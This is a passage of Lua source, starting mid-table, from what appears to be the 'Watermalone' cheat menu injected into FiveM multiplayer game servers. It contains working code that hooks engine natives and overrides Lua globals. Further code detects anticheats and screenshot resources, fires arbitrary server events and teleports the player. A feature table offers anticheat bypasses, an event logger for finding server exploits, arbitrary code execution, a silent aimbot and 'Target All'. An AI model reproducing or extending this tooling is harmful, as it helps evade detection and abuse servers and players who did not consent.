        "1WM7", -- 22
        "0x4E096588B13FFECA", -- 23
        "STRING", -- 24
        "0xB87A37EEB7FAA67D", -- 25
        "0x6C188BE134E074AA", -- 26
        "0x9D77056A530643F6", -- 27
        "0x25F87B30C382FCA7", -- 28
        "0xF9113A30DE5C6670", -- 29
        "0xA3C0B359DCB848B6", -- 30
        "[", -- 31
        "]", -- 32
        "LUA", -- 33
        "AIM", -- 34
        "VIS", -- 35
        "VEH", -- 36
        "WEP", -- 37
        "MIS", -- 38
        "MAL", -- 39
        "PLY", -- 40
        "OTH", -- 41
        "ESX", -- 42
        "AI", -- 43
        "RC", -- 44
        "X", -- 45
        "Pressed Controls: ", -- 46
        "%.2f", -- 47
        "X: ", -- 48
        " | Y: ", -- 49
        " | Z: ", -- 50
        " | H: ", -- 51
        "Talking > ", -- 52
        "number", -- 53
        "LSC", -- 54
        " (", -- 55
        "0xF6062E089251C898", -- 56
        "0xBC38B49BCB83BC9B", -- 57
        "0xFEBFBFDFB66039DE", -- 58
        "0x1636D7FC127B10D2", -- 59
        "0xFA7C7F0AADF25D09", -- 60
        "0x93A3996368C94158", -- 61
        "0xFE8064E3", -- 62
        "0x03D7FB09E75D6B7E", -- 63
        "0xDF735600A4696DAF", -- 64
        "0x75A16C3DA34F1245", -- 65
        "0xD38744167B2FA257", -- 66
        "0x13127EC3665E8EE1", -- 67
        "0x127DE7B20C60A6A3", -- 68
        "t_", -- 69
        "S%W", -- 70
        "SW", -- 71
        "D%A", -- 72
        "         LUA", -- 73
        "      Aimbot", -- 74
        "      Visuals", -- 75
        "      Vehicle", -- 76
        "     Weapons", -- 77
        "Miscellaneous", -- 78
        "     Malicious", -- 79
        "        Player", -- 80
        "        Others", -- 81
        "          ESX", -- 82
        "           AI", -- 83
        "           RC", -- 84
        "srange_gen", -- 85
        "hit_cross", -- 86
        "commonmenu", -- 87
        "arrowleft", -- 88
        "arrowright", -- 89
        "CHAT", -- 90
        "         Chat", -- 91
        "default", -- 92
        identity.long .. ", The Best LUA Menu Changing the scene with H am Mafia . co | Watermalone . NET, Undetected & Unique", -- 93
        "_chat:messageEntered", -- 94
        identity.long .. " Event Log", -- 95
        "m)", -- 96
        "CAMERA", --97
        "       Camera", --98
    }

    function wmlua.F.EventLogInsert(lbl, duration)

        if not duration then duration = 5000 end
        wmlua.F.InsertToTable(wmlua.I.EventLog, {lbl = lbl, initTime = wmlua.N.Get_GameTimer(), duration = duration})

    end

    function wmlua.T.TableContains(tab, val)
        for index, value in ipairs(tab) do
            if value == val then
                return true
            end
        end
        return false
    end

    function wmlua.F.DumpTable(node, trace) -- Not mine

        local cache, stack, output = {},{},{}
        local depth = 1
        local output_str = "{\n"

        while true do
            local size = 0
            for k,v in pairs(node) do
                size = size + 1
            end

            local cur_index = 1
            for k,v in pairs(node) do
                if (cache[node] == nil) or (cur_index >= cache[node]) then

                    if (string.find(output_str,"}",output_str:len())) then
                        output_str = output_str .. ",\n"
                    elseif not (string.find(output_str,"\n",output_str:len())) then
                        output_str = output_str .. "\n"
                    end

                    wmlua.F.InsertToTable(output,output_str)
                    output_str = wmlua.STRINGS[19]

                    local key
                    if (type(k) == wmlua.STRINGS[53] or type(k) == "boolean") then
                        key = wmlua.STRINGS[31]..tostring(k)..wmlua.STRINGS[32]
                    else
                        key = "['"..tostring(k).."']"
                    end

                    if (v ~= utf8.charpattern and type(v) == wmlua.STRINGS[53] or type(v) == "boolean" and v ~= utf8.charpattern) then
                        output_str = output_str .. string.rep('\t',depth) .. key .. " = "..tostring(v)
                    elseif (v ~= utf8.charpattern and type(v) == "table") then
                        output_str = output_str .. string.rep('\t',depth) .. key .. " = {\n"
                        wmlua.F.InsertToTable(stack,node)
                        wmlua.F.InsertToTable(stack,v)
                        cache[node] = cur_index+1
                        break
                    else
                        if v ~= utf8.charpattern then output_str = output_str .. string.rep('\t',depth) .. key .. " = '"..tostring(v).."'" end
                    end

                    if (cur_index == size) then
                        output_str = output_str .. "\n" .. string.rep('\t',depth-1) .. "}"
                    else
                        output_str = output_str .. ","
                    end
                else
                    -- close the table
                    if (cur_index == size) then
                        output_str = output_str .. "\n" .. string.rep('\t',depth-1) .. "}"
                    end
                end

                cur_index = cur_index + 1
            end

            if (size == 0) then
                output_str = output_str .. "\n" .. string.rep('\t',depth-1) .. "}"
            end

            if (#stack > 0) then
                node = stack[#stack]
                stack[#stack] = nil
                depth = cache[node] == nil and depth + 1 or depth - 1
            else
                break
            end

        end

        wmlua.F.InsertToTable(output,output_str)
        output_str = table.concat(output)
        wmlua_print(output_str)

    end

    function wmlua.F.Split(source, delimiters) -- not mine
        local elements = {}
        local pattern = '([^'..delimiters..']+)'
        if source ~= nil then
            string.gsub(source, pattern, function(value) elements[#elements + 1] = value end)
        else
            return nil
        end
        return elements
    end

    wmlua.V.Active = true

    function wmlua.F.spairs(t, order)
        local keys = {}
        for k in pairs(t) do keys[#keys+1] = k end

        if order then
            table.sort(keys, function(a,b) return order(t, a, b) end)
        else
            table.sort(keys)
        end

        local i = 0
        return function()
            i = i + 1
            if keys[i] then
                return keys[i], t[keys[i]]
            end
        end
    end

    function wmlua.F.IsIntEven(val)

        if (val % 2 == 0) then
            return true
        else
            return false
        end

    end

    function wmlua.F.AlphaSort(a, b)
        a = tostring(a)
        b = tostring(b)
        local patt = '^(.-)%s*(%d+)$'
        local _,_, col1, num1 = a:find(patt)
        local _,_, col2, num2 = b:find(patt)
        if (col1 and col2) and col1 == col2 then
            return tonumber(num1) < tonumber(num2)
        end
        return a < b
    end

    function wmlua.F.CleanString(str, stype)

        if type(str) == "string" then
            local _, byte_error = wmlua_pcall(function()
                string.dump(string.byte)
            end)
            if byte_error then
                local kek = ""
                for i = 1, #str do
                    if string.byte(string.sub(str,i,i)) ~= 240 and string.byte(string.sub(str,i,i)) ~= 226 then
                        kek = kek .. string.sub(str,i,i)
                    end
                end
                str = kek
            end
            if stype == "color" then
                if str:find("%b~~") then
                    str = str:gsub("%b~~","")
                end
            elseif stype == "spacing" then
                if str:find("%s") then
                    str = str:gsub("%s","")
                end
            elseif stype == "event" then
                if str:find("'") then
                    wmlua.V._a, wmlua.V._b = string.find(str, "%b''")
                    str = str:sub(wmlua.V._a + 1, wmlua.V._b - 1)
                elseif str:find('"') then
                    wmlua.V._a, wmlua.V._b = string.find(str, '%b""')
                    str = str:sub(wmlua.V._a + 1, wmlua.V._b - 1)
                end
            end
        end
        return str

    end

    function wmlua.F.PressedCTRL(igp, cnt)

        if wmlua.N.GetInputMethod(0) then
            local c_s = wmlua.H.WMInvokeNative(0x91AEF906BCA88877, tonumber(igp), tonumber(cnt))
            if c_s and wmlua.V.InputActive == false then
                return true
            else
                return false
            end
        end

    end

    function wmlua.F.ReleasedCTRL(igp, cnt)

        if wmlua.N.GetInputMethod(0) then
            local c_s = wmlua.H.WMInvokeNative(0x305C8DCD79DA8B0F, tonumber(igp), tonumber(cnt))
            if c_s and wmlua.V.InputActive == false then
                return true
            else
                return false
            end
        end

    end

    function wmlua.F.HoldingCTRL(igp, cnt)

        if wmlua.N.GetInputMethod(0) then
            local c_s = wmlua.H.WMInvokeNative(0xE2587F8CBBD87B1D, tonumber(igp), tonumber(cnt))
            if c_s and wmlua.V.InputActive == false then
                return true
            else
                return false
            end
        end

    end

    function wmlua_SendEvent(server, e, ...)
        local KEK = wmlua.msgpack.pack({...})
        if e ~= nil then
            if KEK ~= nil and server < 1 then
                wmlua.H.WMInvokeNative(0x91310870, e, KEK, KEK:len())
            elseif KEK ~= nil then
                wmlua.H.WMInvokeNative(0x7FDD1128, e, KEK, KEK:len())
            end
        else
            wmlua.F.EventLogInsert("[~r~WM~w~] Crash prevented")
        end
    end

    function wmlua.F.TeleportToCoords(x,y,z)

        if wmlua.N.IsPedInAVehicle(wmlua.N.GetPlayerPed()) then
            wmlua.H.WMInvokeNative(0x06843DA7060A026B, wmlua.N.GetVehiclePedIsIn(wmlua.N.GetPlayerPed(), false), x + .0, y + .0, z + .0)
        else
            wmlua.H.WMInvokeNative(0x06843DA7060A026B, wmlua.N.GetPlayerPed(), x + .0, y + .0, z + .0)
        end

    end

    wmlua.S.menuKey = 348 -- MMB

    wmlua.T.Weapons = {
        { spawncode = "weapon_unarmed", label = "Fists", hash = wmlua.N.GetHashKey("weapon_unarmed") },
        -- Melee
        { spawncode = "weapon_dagger", label = "Dagger", hash = wmlua.N.GetHashKey("weapon_dagger") },
        { spawncode = "weapon_bat", label = "Bat", hash = wmlua.N.GetHashKey("weapon_bat") },
        { spawncode = "weapon_bottle", label = "Bottle", hash = wmlua.N.GetHashKey("weapon_bottle") },
        { spawncode = "weapon_crowbar", label = "Crowbar", hash = wmlua.N.GetHashKey("weapon_crowbar") },
        { spawncode = "weapon_flashlight", label = "Flashlight", hash = wmlua.N.GetHashKey("weapon_flashlight") },
        { spawncode = "weapon_golfclub", label = "Golf Club", hash = wmlua.N.GetHashKey("weapon_golfclub") },
        { spawncode = "weapon_hammer", label = "Hammer", hash = wmlua.N.GetHashKey("weapon_hammer") },
        { spawncode = "weapon_hatchet", label = "Hatchet", hash = wmlua.N.GetHashKey("weapon_hatchet") },
        { spawncode = "weapon_knuckle", label = "Brass Knuckles", hash = wmlua.N.GetHashKey("weapon_knuckle") },
        { spawncode = "weapon_knife", label = "Knife", hash = wmlua.N.GetHashKey("weapon_knife") },
        { spawncode = "weapon_machete", label = "Machete", hash = wmlua.N.GetHashKey("weapon_machete") },
        { spawncode = "weapon_nightstick", label = "Machete", hash = wmlua.N.GetHashKey("weapon_nightstick") },
        { spawncode = "weapon_wrench", label = "Wrench", hash = wmlua.N.GetHashKey("weapon_wrench") },
        { spawncode = "weapon_battleaxe", label = "Battle Axe", hash = wmlua.N.GetHashKey("weapon_battleaxe") },
        { spawncode = "weapon_poolcue", label = "Pool Cue", hash = wmlua.N.GetHashKey("weapon_poolcue") },
        { spawncode = "weapon_stone_hatchet", label = "Stone Hatchet", hash = wmlua.N.GetHashKey("weapon_stone_hatchet") },
        -- Pistols
        { spawncode = "weapon_pistol", label = "Pistol", hash = wmlua.N.GetHashKey("weapon_pistol") },
        { spawncode = "weapon_pistol_mk2", label = "Pistol Mk2", hash = wmlua.N.GetHashKey("weapon_pistol_mk2") },
        { spawncode = "weapon_combatpistol", label = "Combat Pistol", hash = wmlua.N.GetHashKey("weapon_combatpistol") },
        { spawncode = "weapon_appistol", label = "AP Pistol", hash = wmlua.N.GetHashKey("weapon_appistol") },
        { spawncode = "weapon_stungun", label = "Tazer", hash = wmlua.N.GetHashKey("weapon_stungun") },
        { spawncode = "weapon_pistol50", label = "Pistol 50", hash = wmlua.N.GetHashKey("weapon_pistol50") },
        { spawncode = "weapon_snspistol", label = "SNS Pistol", hash = wmlua.N.GetHashKey("weapon_snspistol") },
        { spawncode = "weapon_snspistol_mk2", label = "SNS Pistol Mk2", hash = wmlua.N.GetHashKey("weapon_snspistol_mk2") },
        { spawncode = "weapon_heavypistol", label = "Heavy Pistol", hash = wmlua.N.GetHashKey("weapon_heavypistol") },
        { spawncode = "weapon_vintagepistol", label = "Vintage Pistol", hash = wmlua.N.GetHashKey("weapon_vintagepistol") },
        { spawncode = "weapon_flaregun", label = "Flare Gun", hash = wmlua.N.GetHashKey("weapon_flaregun") },
        { spawncode = "weapon_marksmanpistol", label = "Marksman Pistol", hash = wmlua.N.GetHashKey("weapon_marksmanpistol") },
        { spawncode = "weapon_revolver", label = "Revolver", hash = wmlua.N.GetHashKey("weapon_revolver") },
        { spawncode = "weapon_revolver_mk2", label = "Revolver Mk2", hash = wmlua.N.GetHashKey("weapon_revolver_mk2") },
        { spawncode = "weapon_doubleaction", label = "Double Action Revolver", hash = wmlua.N.GetHashKey("weapon_doubleaction") },
        { spawncode = "weapon_raypistol", label = "Ray Pistol", hash = wmlua.N.GetHashKey("weapon_raypistol") },
        -- SMGs
        { spawncode = "weapon_microsmg", label = "Micro SMG", hash = wmlua.N.GetHashKey("weapon_microsmg") },
        { spawncode = "weapon_smg", label = "Submachine Gun", hash = wmlua.N.GetHashKey("weapon_smg") },
        { spawncode = "weapon_smg_mk2", label = "Submachine Gun Mk2", hash = wmlua.N.GetHashKey("weapon_smg_mk2") },
        { spawncode = "weapon_assaultsmg", label = "Assault SMG", hash = wmlua.N.GetHashKey("weapon_assaultsmg") },
        { spawncode = "weapon_combatpdw", label = "Combat PDW", hash = wmlua.N.GetHashKey("weapon_combatpdw") },
        { spawncode = "weapon_machinepistol", label = "Machine Pistol", hash = wmlua.N.GetHashKey("weapon_machinepistol") },
        { spawncode = "weapon_minismg", label = "Mini SMG", hash = wmlua.N.GetHashKey("weapon_minismg") },
        { spawncode = "weapon_raycarbine", label = "Ray Carbine", hash = wmlua.N.GetHashKey("weapon_raycarbine") },
        -- SGs
        { spawncode = "weapon_pumpshotgun", label = "Pump Shotgun", hash = wmlua.N.GetHashKey("weapon_pumpshotgun") },
        { spawncode = "weapon_pumpshotgun_mk2", label = "Pump Shotgun Mk2", hash = wmlua.N.GetHashKey("weapon_pumpshotgun_mk2") },
        { spawncode = "weapon_sawnoffshotgun", label = "Sawnoff Shotgun", hash = wmlua.N.GetHashKey("weapon_sawnoffshotgun") },
        { spawncode = "weapon_assaultshotgun", label = "Assault Shotgun", hash = wmlua.N.GetHashKey("weapon_assaultshotgun") },
        { spawncode = "weapon_bullpupshotgun", label = "Bullpup Shotgun", hash = wmlua.N.GetHashKey("weapon_bullpupshotgun") },
        { spawncode = "weapon_musket", label = "Musket", hash = wmlua.N.GetHashKey("weapon_musket") },
        { spawncode = "weapon_heavyshotgun", label = "Heavy Shotgun", hash = wmlua.N.GetHashKey("weapon_heavyshotgun") },
        { spawncode = "weapon_dbshotgun", label = "Double Barrel SG", hash = wmlua.N.GetHashKey("weapon_dbshotgun") },
        { spawncode = "weapon_autoshotgun", label = "Auto Shotgun", hash = wmlua.N.GetHashKey("weapon_autoshotgun") },
        -- Assault Rifles
        { spawncode = "weapon_assaultrifle", label = "Assault Rifle", hash = wmlua.N.GetHashKey("weapon_assaultrifle") },
        { spawncode = "weapon_assaultrifle_mk2", label = "Assault Rifle Mk2", hash = wmlua.N.GetHashKey("weapon_assaultrifle_mk2") },
        { spawncode = "weapon_carbinerifle", label = "Carbine Rifle", hash = wmlua.N.GetHashKey("weapon_carbinerifle") },
        { spawncode = "weapon_carbinerifle_mk2", label = "Carbine Rifle Mk2", hash = wmlua.N.GetHashKey("weapon_carbinerifle_mk2") },
        { spawncode = "weapon_advancedrifle", label = "Advanced Rifle", hash = wmlua.N.GetHashKey("weapon_advancedrifle") },
        { spawncode = "weapon_specialcarbine", label = "Special Carbine", hash = wmlua.N.GetHashKey("weapon_specialcarbine") },
        { spawncode = "weapon_specialcarbine_mk2", label = "Special Carbine Mk2", hash = wmlua.N.GetHashKey("weapon_specialcarbine_mk2") },
        { spawncode = "weapon_bullpuprifle", label = "Bullpup Rifle", hash = wmlua.N.GetHashKey("weapon_bullpuprifle") },
        { spawncode = "weapon_bullpuprifle_mk2", label = "Bullpup Rifle Mk2", hash = wmlua.N.GetHashKey("weapon_bullpuprifle_mk2") },
        { spawncode = "weapon_compactrifle", label = "Compact Rifle", hash = wmlua.N.GetHashKey("weapon_compactrifle") },
        -- LMGs
        { spawncode = "weapon_mg", label = "Machine Gun", hash = wmlua.N.GetHashKey("weapon_mg") },
        { spawncode = "weapon_combatmg", label = "Combat MG", hash = wmlua.N.GetHashKey("weapon_combatmg") },
        { spawncode = "weapon_combatmg_mk2", label = "Combat MG Mk2", hash = wmlua.N.GetHashKey("weapon_combatmg_mk2") },
        { spawncode = "weapon_gusenberg", label = "Tommy Gun", hash = wmlua.N.GetHashKey("weapon_gusenberg") },
        -- Sniper Rifles
        { spawncode = "weapon_sniperrifle", label = "Sniper Rifle", hash = wmlua.N.GetHashKey("weapon_sniperrifle") },
        { spawncode = "weapon_heavysniper", label = "Heavy Sniper", hash = wmlua.N.GetHashKey("weapon_heavysniper") },
        { spawncode = "weapon_heavysniper_mk2", label = "Heavy Sniper Mk2", hash = wmlua.N.GetHashKey("weapon_heavysniper_mk2") },
        { spawncode = "weapon_marksmanrifle", label = "Marksman Rifle", hash = wmlua.N.GetHashKey("weapon_marksmanrifle") },
        { spawncode = "weapon_marksmanrifle_mk2", label = "Marksman Rifle Mk2", hash = wmlua.N.GetHashKey("weapon_marksmanrifle_mk2") },
        -- Heavy Weapons
        { spawncode = "weapon_rpg", label = "RPG", hash = wmlua.N.GetHashKey("weapon_rpg") },
        { spawncode = "weapon_grenadelauncher", label = "Grenade Launcher", hash = wmlua.N.GetHashKey("weapon_grenadelauncher") },
        { spawncode = "weapon_grenadelauncher_smoke", label = "Smoke Grenade Launcher", hash = wmlua.N.GetHashKey("weapon_grenadelauncher_smoke") },
        { spawncode = "weapon_minigun", label = "Minigun", hash = wmlua.N.GetHashKey("weapon_minigun") },
        { spawncode = "weapon_firework", label = "Firework Launcher", hash = wmlua.N.GetHashKey("weapon_firework") },
        { spawncode = "weapon_railgun", label = "Railgun", hash = wmlua.N.GetHashKey("weapon_railgun") },
        { spawncode = "weapon_hominglauncher", label = "Homing Launcher", hash = wmlua.N.GetHashKey("weapon_hominglauncher") },
        { spawncode = "weapon_compactlauncher", label = "Compact Grenade Launcher", hash = wmlua.N.GetHashKey("weapon_compactlauncher") },
        { spawncode = "weapon_rayminigun", label = "Ray Minigun", hash = wmlua.N.GetHashKey("weapon_rayminigun") },
        -- Throwables
        { spawncode = "weapon_grenade", label = "Grenade", hash = wmlua.N.GetHashKey("weapon_grenade") },
        { spawncode = "weapon_bzgas", label = "BZ Gas", hash = wmlua.N.GetHashKey("weapon_bzgas") },
        { spawncode = "weapon_molotov", label = "Molotov", hash = wmlua.N.GetHashKey("weapon_molotov") },
        { spawncode = "weapon_stickybomb", label = "Sticky Bomb", hash = wmlua.N.GetHashKey("weapon_stickybomb") },
        { spawncode = "weapon_proxmine", label = "Proximity Mine", hash = wmlua.N.GetHashKey("weapon_proxmine") },
        { spawncode = "weapon_snowball", label = "Snowball", hash = wmlua.N.GetHashKey("weapon_snowball") },
        { spawncode = "weapon_pipebomb", label = "Pipe Bomb", hash = wmlua.N.GetHashKey("weapon_pipebomb") },
        { spawncode = "weapon_ball", label = "Base Ball", hash = wmlua.N.GetHashKey("weapon_ball") },
        { spawncode = "weapon_smokegrenade", label = "Smoke Grenade", hash = wmlua.N.GetHashKey("weapon_smokegrenade") },
        { spawncode = "weapon_flare", label = "Flare", hash = wmlua.N.GetHashKey("weapon_flare") },
        -- MISC
        { spawncode = "weapon_petrolcan", label = "Petrol Can", hash = wmlua.N.GetHashKey("weapon_petrolcan") },
        { spawncode = "gadget_parachute", label = "Parachute", hash = wmlua.N.GetHashKey("gadget_parachute") },
        { spawncode = "weapon_fireextinguisher", label = "Fire Extinguisher", hash = wmlua.N.GetHashKey("weapon_fireextinguisher") },
    }

    wmlua.T.Wephashes = {}
    for k,v in pairs(wmlua.T.Weapons) do
        wmlua.T.Wephashes[v.hash] = v
    end

    wmlua.V.showsid = false

    wmlua.V.theme = "Dark"

    wmlua.V.theme_menu_bg_r = 0
    wmlua.V.theme_menu_bg_g = 0
    wmlua.V.theme_menu_bg_b = 0
    wmlua.V.theme_menu_bg_a = 205

    wmlua.V.theme_button_bg_r = 20
    wmlua.V.theme_button_bg_g = 20
    wmlua.V.theme_button_bg_b = 20
    wmlua.V.theme_button_bg_a = 150

    wmlua.T.apblips = {}
    wmlua.T.spblips = {}

    function wmlua.F.Unload_wmlua()

        if wmlua.H.oldInvoke then wmlua.H.InvokeNative = wmlua.H.oldInvoke end
        wmlua.N.DisableWeaponInputs(false)

        wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId()) .. " (" .. wmlua.N.ScGetNickname() .. ")", "Unloaded Watermalone")

        for k,v in pairs(wmlua.T.GamerTags) do
            wmlua.N.RemoveGamerTag(v.tag)
            wmlua.T.GamerTags[k] = nil
        end

        for _, v in ipairs(wmlua.T.apblips) do
            wmlua.N.RemoveBlip(v)
        end
        
        for _, v in pairs(wmlua.T.spblips) do
            if v.blip ~= nil then
                wmlua.N.RemoveBlip(v.blip)
            end
        end

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_heatseek"]].active then
            wmlua.F.VISHeatSeek()
        end

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active then
            wmlua.F.DeleteCam()
            wmlua.N.SetFocusEntity(wmlua.N.GetPlayerPed())
        end
        
        -- wmlua.N.DestroyDui(wmlua.S.LogsDUI)
        wmlua.N.DestroyDui(wmlua.V.rtex_dui)
        if not cotuwidzisz then CreateThread = wmlua_Thread Citizen.CreateThread = wmlua_Thread end

        wmlua = nil
        wmlua_Thread = nil
        wmlua_Schleep = nil

        if di then debug.getinfo = di end
        --if ts then tostring = ts end
        if t then type = t end
        if o_ipairs then ipairs = o_ipairs end
        if o_pairs then pairs = o_pairs end

    end

    wmlua.KM = wmlua.F.Unload_wmlua

    wmlua.V.__TA = false
    
    function wmlua.RetrieveLoads()
        if wmlua.B.wmLoadCount then
            wmlua_Thread(function()
                wmlua.V.LoadsCount = wmlua.B.wmLoadCount() - 1
                for i = 0, wmlua.V.LoadsCount do
                    local lcontent = wmlua.B.wmLoadGet(i)
                    if string.find(string.lower(lcontent), "atg.", 1, true) and wmlua.I.ATGFound ~= true then
                        wmlua.I.ATGFound = true
                        wmlua.F.EventLogInsert("[~b~WM~w~] ATG Anticheat found ", 10000)
                    end
                    wmlua.V.waveshield = [['resourcecounter',"^^"]]
                    if string.find(string.lower(lcontent), string.lower(wmlua.V.waveshield), 1, true) and wmlua.I.WaveFound ~= true then
                        wmlua.I.WaveFound = true
                        wmlua.F.EventLogInsert("[~b~WM~w~] Waveshield Anticheat found", 10000)
                    end
                    wmlua.F.InsertToTable(wmlua.T.LoadCalls, lcontent)
                end
            end)
        end
    end

    wmlua.RetrieveLoads()

    for i = 1, #wmlua.T.LoadCalls do
        local lcontent = wmlua.F.Split(wmlua.T.LoadCalls[i], '\n')
        wmlua_print('\n'..lcontent)
    end
    
    function wmlua.F.RequestControl(entity)
        
        wmlua.H.WMInvokeNative(0xB69317BF5E782347, entity)
        
        local timeout_end = wmlua.N.Get_GameTimer() + 500
        while timeout_end > wmlua.N.Get_GameTimer() and not wmlua.N.NetworkHasControlOfEntity(entity) do
            wmlua_Schleep(0)
        end
        
    end


    RegisterNetEvent(wmlua.API.loadEvent)
    AddEventHandler(wmlua.API.loadEvent, function(kek)

        local replaces = {
            {orig = "Watermalone.API.DumpTable", new = "wmlua.F.DumpTable"},
            {orig = "Watermalone.API.AddButton", new = "wmlua.API.AddButton"},
        }

        wmlua_print('LE Before Edit > \n' .. kek)

        for k,v in ipairs(replaces) do

            kek = kek:gsub(v.orig, v.new)

        end

        wmlua_print('LE After Edit > \n' .. kek)

    end)

    wmlua.T.ResourceDI = {}

    wmlua_Thread(function()
        wmlua.V.ResourcesCount = wmlua.N.GetNumResources() - 1
        for i = 0, wmlua.V.ResourcesCount do
            wmlua.V.ResName = wmlua.N.GetResourceByFindIndex(i)
            if wmlua.V.ResName ~= nil then
                wmlua.F.InsertToTable(wmlua.R, wmlua.V.ResName)
                wmlua.T.ResourceDI[wmlua.V.ResName] = true
                wmlua.V.ResName = string.lower(wmlua.V.ResName)
                local ssCheck = wmlua.N.LoadResourceFile(wmlua.V.ResName, 'dist/ui.html')
                if ssCheck and #ssCheck > 1 then
                    if string.find(ssCheck, "Screenshot Helper", 1, true) then
                        wmlua.I.SSAbility = true
                        wmlua.F.EventLogInsert('[~r~WM~w~] Current server has screenshot ability', 30 * 1000)
                        wmlua.F.EventLogInsert('[~r~WM~w~] Screenshot Resource: ' .. wmlua.V.ResName, 30 * 1000)
                    end
                end
            end
        end
    end)

    function wmlua.F.BuildCheese()
        wmlua.T.Cheese = {

            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Set Entity Queue Time, Waits while spawning ents to prevent getting tagged by spam checks", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_setentityqueue", label = "Set Entity Queue Time", func = "wmlua.F.SetEntityQueue", efunc = wmlua.F.LUASetEntityQueue, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Derestrict, Prevents some AC Checks like antispectate, etc]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_derestrict", label = "Derestrict", func = "wmlua.F.LUADerestrict", efunc = wmlua.F.LUADerestrict, MultiTarget = false, codeExecution = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Bypass GGAC, Disables the anticheat on the gungame server]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_bypassggac", label = "Disable GGAC", func = "wmlua.F.LUABypassGGAC", efunc = wmlua.F.LUABypassGGAC, MultiTarget = false, codeExecution = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Log Server Events, Logs the input of server events to figure out exploits easily as you play]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_logserverevents", label = "Log Server Events", func = "wmlua.F.LUALogTriggers", efunc = wmlua.F.LUALogTriggers, MultiTarget = false, codeExecution = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Exclude from Event Logger, Excludes events from the event logger]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_excludeevent", label = "Exclude event from logging", func = "wmlua.F.LUAHideTrigger", efunc = wmlua.F.LUAHideTrigger, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Include to Event Logger, Includes events to the event logger that where hidden]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_includeevent", label = "Include event from logging", func = "wmlua.F.LUAShowTrigger", efunc = wmlua.F.LUAShowTrigger, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Target All, Targets all players]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_targetall", label = "Target All", func = "wmlua.F.TargetAll", efunc = wmlua.F.TargetAll, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Runcode, Execute LUA code]", tab = "LUA", ctrlType = "button", bind = {9001}, name = "wmlua.V.Lua_runcode", label = "Run LUA Code", func = "wmlua.F.LUARunCode", efunc = wmlua.F.LUARunCode, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Include Events in WM Event Logger, Shows events inside of the WM Event Logger]", tab = "LUA", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Lua_eventlogger_includeevents", label = "Show Events in WM Event Logger", func = "wmlua.F.LUAEventLoggerIncludeEvents", efunc = wmlua.F.LUAEventLoggerIncludeEvents, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "LUA [Safe Mode, Prevents you from running flaggable features]", tab = "LUA", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Lua_safemode", label = "Safe Mode", func = "wmlua.F.LUASafeMode", efunc = wmlua.F.LUASafeMode, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Draw Pressed Controls, Draw all pressed Keys (Controls)]", tab = "LUA", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Lua_drawcontrol", label = "Draw Pressed Controls", func = "wmlua.F.LUADrawControl", efunc = wmlua.F.LUADrawControl, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "LUA [Draw Functions, Toggle all drawing from the menu]", tab = "LUA", ctrlType = "toggle", bind = {210,15}, name = "wmlua.V.AllDraw", label = "Drawing Functions", func = "wmlua.F.DrawToggle", efunc = wmlua.F.DrawToggle, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "LUA [Use GTA Input, Use GTA Input boxes for compatibility reasons]", tab = "LUA", ctrlType = "toggle", bind = {210,15}, name = "wmlua.V.UseGTAInput", label = "Use GTA Input Box", func = "wmlua.F.UseGTAInput", efunc = wmlua.F.UseGTAInput, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = true, advertname = "AIM [Toggle, Toggles watermalones silent aim (Perfect, no twitches)]", tab = "AIM", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Aim_tog", label = "Aimbot", func = "wmlua.F.AimToggle", efunc = wmlua.F.AimToggle, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Distance, Only act within a distance]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_distance", label = "Aim Distance 150", func = "wmlua.F.AimDistance", efunc = wmlua.F.AimDistance, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Damage, Overridies the damage applied by the aimbot]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_damage", label = "Aim Damage Default", func = "wmlua.F.AimDamage", efunc = wmlua.F.AimDamage, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Set FOV, Custom field of view for targeting]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_setfov", label = "Set FOV", func = "wmlua.F.AimSetFOV", efunc = wmlua.F.aim_setfov, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AIM [Act Chance, Changes the chance that the aimbot will act upon shooting]", tab = "AIM", ctrlType = "button", bind = {9001}, name = "wmlua.V.Aim_changeactchance", label = "Act Chance 100", func = "wmlua.F.AimChangeActChance", efunc = wmlua.F.AimChangeActChance, MultiTarget = false},
